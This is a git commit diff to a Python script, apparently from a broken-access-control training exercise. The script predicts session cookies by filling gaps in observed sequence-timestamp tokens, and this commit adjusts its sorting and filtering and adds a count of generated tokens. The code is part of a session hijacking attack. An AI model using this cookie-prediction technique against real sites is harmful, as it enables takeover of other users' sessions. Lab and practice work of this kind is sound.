55f281fe1d5c3f8b0529a9a3fa97e345ca27cf1f
James-Lu-none <jamesabcde277@gmail.com>
2024-01-19 19:50:29 +0800

    show gen token num

--- brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
+++ brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
@@ -11,7 +11,7 @@ with open(file_path, 'r', encoding='utf-8') as file:
         # print(f"{seq} {epoch_time}")
         tokens.append((int(seq), int(epoch_time)))
 tokens = sorted(tokens, key=lambda x: x[0])
-print(tokens[0])
+# print(tokens[0])
 dif=[]
 for i in range(len(tokens)-1):
     s0,t0=tokens[i]
@@ -21,7 +21,7 @@ for i in range(len(tokens)-1):
         # print(s0+1)
         dif.append((str(s0+1) , str(t0), str(t1), str(t1-t0)))
 
-dif = sorted(dif, key=lambda x: int(x[3]),reverse=True)
+dif = sorted(dif, key=lambda x: int(x[0]),reverse=True)
 
 possible_cookie_file="./possibleCookie"
 f = open(os.path.join(current_dir,possible_cookie_file), "w")
@@ -34,9 +34,10 @@ for i in dif:
     s,t0,t1,dt=i
     dt=int(dt)
     t0=int(t0)
-    if(dt<10): continue
     for j in range(dt+1):
+        # if(dt==0): print(j)
         cookie_gen.append(f"{s}-{t0+j}")
+print(f"{len(cookie_gen)} token generated")
 gen_cookies_file="./gen_cookies"
 f = open(os.path.join(current_dir,gen_cookies_file), "w")
 for i in cookie_gen:
